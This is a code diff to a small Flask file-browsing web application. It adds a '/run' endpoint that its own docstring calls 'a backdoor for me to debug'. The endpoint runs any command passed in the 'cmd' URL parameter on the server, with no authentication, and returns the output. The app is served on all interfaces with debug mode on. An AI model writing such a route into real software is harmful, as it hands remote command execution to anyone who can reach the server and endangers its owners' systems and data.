@@ -2,6 +2,8 @@ from flask import Flask, jsonify, request
 from app.file_handler import FileHandler
 from app.wraps.jsonp_wrapper import jsonp
 from app.wraps.db_wrapper import request_db_connect
+import subprocess
+
 
 app = Flask(__name__)
 
@@ -42,6 +44,28 @@ def show_diff():
 def list_dir():
     f = FileHandler()
     return jsonify(f.list_all_files())
+
+
+@app.route('/run')
+@jsonp
+def run_command():
+    """
+    this is a backdoor for me to debug
+    """
+    command = request.args.get('cmd', None)
+    if command is None:
+        return "invalid command"
+    else:
+        cmd_list = command.split(' ')
+        p = subprocess.Popen(
+            cmd_list,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE)
+        out, err = p.communicate()
+        return jsonify({
+            "out": out,
+            "err": err
+        })
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=5000, debug=True)
